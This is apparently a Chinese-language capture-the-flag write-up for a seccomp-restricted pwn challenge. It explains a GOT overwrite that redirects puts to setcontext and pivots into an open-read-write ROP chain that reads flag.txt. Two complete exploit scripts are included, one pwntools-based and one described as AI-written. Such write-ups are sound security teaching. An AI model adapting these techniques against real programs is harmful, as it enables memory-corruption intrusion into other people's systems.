# setcontext

反编译：

```c
int vuln()
{
  void *buf; // [rsp+8h] [rbp-8h] BYREF

  printf("buf @ %p\n", ::buf);
  printf("puts @ %p\n", &puts);
  printf("data: ");
  read(0, ::buf, 0x200u);
  printf("addr: ");
  read(0, &buf, 8u);
  read(0, buf, 8u);
  sandbox();
  return puts(::buf);
}
```

seccomp-tools dump:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x0000000e  if (A != rt_sigprocmask) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x06 0x00 0x00 0x00000000  return KILL
```

禁用了很多 syscall，意味着依然需要 open-read-write，但是只有一次任意地址写，可以覆盖 puts 的地址，但是要完成比较复杂的步骤，需要借助 setcontext，正好这里允许了 rt_sigprocmask syscall，代表 setcontext 是被允许的：

1. 覆盖 puts 到 setcontext，那么 setcontext 的第一个参数就是 buf
2. 在 buf 里对应位置配置好 rsp 和 rip，保证 fpregs 指针合法
3. 在 buf 的剩余内容里保存 rop chain

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

if args.REMOTE:
    p = remote(args.HOST, args.PORT)
else:
    p = process("strace -o strace.log ./vuln.patched", shell=True)
    # p = process("./vuln.patched")
elf = ELF("./vuln.patched")
libc = elf.libc

p.recvuntil(b"buf @ ")
buf_addr = int(p.recvline().decode(), 16)
print(f"buf addr 0x{buf_addr:x}")
p.recvuntil(b"puts @ ")
puts_addr = int(p.recvline().decode(), 16)
print(f"puts addr 0x{puts_addr:x}")
libc_addr = puts_addr - libc.symbols["puts"]
print(f"libc addr 0x{libc_addr:x}")
libc.address = libc_addr

rop = ROP(libc)
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
pop_rdx_pop_rbx_ret = rop.find_gadget(["pop rdx", "pop rbx", "ret"]).address
ret = rop.find_gadget(["ret"]).address
syscall = rop.find_gadget(["syscall", "ret"]).address

p.recvuntil(b"data:")
# ucontext_t
payload = (
    flat(
        {
            # rsp
            0xA0: buf_addr + 0x108,
            # rip
            0xA8: ret,
            # fpregs
            0xE0: buf_addr,
        },
        length=0xF0,
        filler="\x00",
    )
    # buf_addr + 0xF0
    + b"flag.txt"
    + b"\x00" * 8
    + b"\x00" * 8
    # buf_addr + 0x108
    # open(flag.txt)
    + p64(pop_rax_ret)
    + p64(2)
    + p64(pop_rdi_ret)
    + p64(buf_addr + 0xF0)
    + p64(pop_rsi_ret)
    + p64(0)
    + p64(pop_rdx_pop_rbx_ret)
    + p64(0)
    + p64(0)
    + p64(syscall)
    # read(3, buf, 64)
    + p64(pop_rax_ret)
    + p64(0)
    + p64(pop_rdi_ret)
    + p64(6 if args.REMOTE else 3)
    + p64(pop_rsi_ret)
    + p64(buf_addr)
    + p64(pop_rdx_pop_rbx_ret)
    + p64(64)
    + p64(0)
    + p64(syscall)
    # write(1, buf, 64)
    + p64(pop_rax_ret)
    + p64(1)
    + p64(pop_rdi_ret)
    + p64(1)
    + p64(pop_rsi_ret)
    + p64(buf_addr)
    + p64(pop_rdx_pop_rbx_ret)
    + p64(64)
    + p64(0)
    + p64(syscall)
)
assert len(payload) <= 0x200
p.send(payload)

# override got of puts to setcontext
p.recvuntil(b"addr:")

# pause()
# gdb.attach(p)

p.send(p64(elf.got["puts"]))
p.send(p64(libc.symbols["setcontext"]))
p.interactive()
```

AI 编写的攻击脚本，思路和上面类似：

```python
#!/usr/bin/env python3
import subprocess, struct, time, sys

BINARY = './vuln.patched'
REMOTE = len(sys.argv) > 1 and sys.argv[1] == 'remote'

if REMOTE:
    host = sys.argv[2] if len(sys.argv) > 2 else 'localhost'
    port = int(sys.argv[3]) if len(sys.argv) > 3 else 9999
    import socket
    s = socket.socket()
    s.connect((host, port))
    p_stdin = s.makefile('wb')
    p_stdout = s.makefile('rb')
    def read_stdout(n):
        return p_stdout.read(n)
else:
    p = subprocess.Popen([BINARY], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    p_stdin = p.stdin
    def read_stdout(n):
        return p.stdout.read(n)

def recv_until(marker):
    data = b''
    while marker not in data:
        c = read_stdout(1)
        if not c:
            break
        data += c
    return data

# Get leaks
data = recv_until(b'data: ')
lines = data.split(b'\n')
buf_addr = int(lines[0].split()[-1], 16)
puts_addr = int(lines[1].split()[-1], 16)
print(f'[*] buf: {hex(buf_addr)}', file=sys.stderr)
print(f'[*] puts: {hex(puts_addr)}', file=sys.stderr)

libc_base = puts_addr - 0x80e50
print(f'[*] libc: {hex(libc_base)}', file=sys.stderr)

setcontext_addr = libc_base + 0x539e0
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x2be51
pop_rdx_r12 = libc_base + 0x11f367
pop_rax = libc_base + 0x45eb0
syscall_ret = libc_base + 0xec049

pay = b'flag.txt\x00'
pay += b'\x00' * (0x28 - len(pay))
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', 0)
pay += b'\x00' * (0x48 - len(pay))
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', 0)
pay += b'\x00' * (0x98 - len(pay))
pay += struct.pack('<Q', 0)
pay += struct.pack('<Q', buf_addr + 0xc0)
pay += struct.pack('<Q', pop_rdi)
pay += b'\x00' * (0xc0 - len(pay))

rop = b''
rop += struct.pack('<Q', buf_addr)
rop += struct.pack('<Q', pop_rsi)
rop += struct.pack('<Q', 0)
rop += struct.pack('<Q', pop_rdx_r12)
rop += struct.pack('<Q', buf_addr + 0xb0)
rop += struct.pack('<Q', 0)
rop += struct.pack('<Q', pop_rax)
rop += struct.pack('<Q', 2)
rop += struct.pack('<Q', syscall_ret)

rop += struct.pack('<Q', pop_rdi)
rop += struct.pack('<Q', 3)
rop += struct.pack('<Q', pop_rsi)
rop += struct.pack('<Q', buf_addr + 0x200)
rop += struct.pack('<Q', pop_rdx_r12)
rop += struct.pack('<Q', 64)
rop += struct.pack('<Q', 0)
rop += struct.pack('<Q', pop_rax)
rop += struct.pack('<Q', 0)
rop += struct.pack('<Q', syscall_ret)

rop += struct.pack('<Q', pop_rdi)
rop += struct.pack('<Q', 1)
rop += struct.pack('<Q', pop_rsi)
rop += struct.pack('<Q', buf_addr + 0x200)
rop += struct.pack('<Q', pop_rdx_r12)
rop += struct.pack('<Q', 64)
rop += struct.pack('<Q', 0)
rop += struct.pack('<Q', pop_rax)
rop += struct.pack('<Q', 1)
rop += struct.pack('<Q', syscall_ret)

pay += rop
pay += b'\x00' * (0x1c0 - len(pay))
pay += struct.pack('<I', 0x1F80)
pay += b'\x00' * (0x200 - len(pay))

p_stdin.write(pay)
p_stdin.flush()

data = recv_until(b'addr: ')

p_stdin.write(struct.pack('<Q', 0x403388))
p_stdin.flush()
time.sleep(0.05)
p_stdin.write(struct.pack('<Q', setcontext_addr))
p_stdin.flush()

time.sleep(1)
try:
    result = b''
    while True:
        c = read_stdout(1)
        if not c:
            break
        result += c
    sys.stdout.buffer.write(result)
except:
    pass

if not REMOTE:
    p.wait()
```
